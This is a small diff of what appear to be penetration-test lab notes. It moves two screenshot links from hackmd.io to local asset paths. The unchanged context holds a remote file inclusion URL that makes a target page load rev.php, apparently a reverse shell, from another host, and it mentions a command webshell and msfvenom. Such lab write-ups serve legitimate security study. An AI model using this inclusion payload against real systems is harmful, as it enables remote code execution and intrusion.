@@ -145,11 +145,13 @@ Target: http://192.168.218.53:4443/
                                                                              
 Task Completed
 ```
-![image](https://hackmd.io/_uploads/H17wn5Z9be.png)
+
+![image](_assets/H17wn5Z9be.png)
 
 `http://192.168.218.53:4443/site/index.php?page=http://192.168.45.235/rev.php`
 1. cmd webshell(got redirect after execute)
-![image](https://hackmd.io/_uploads/SySd39W5-l.png)
+
+   ![image](_assets/SySd39W5-l.png)
 
 2. msfvenom
 ```
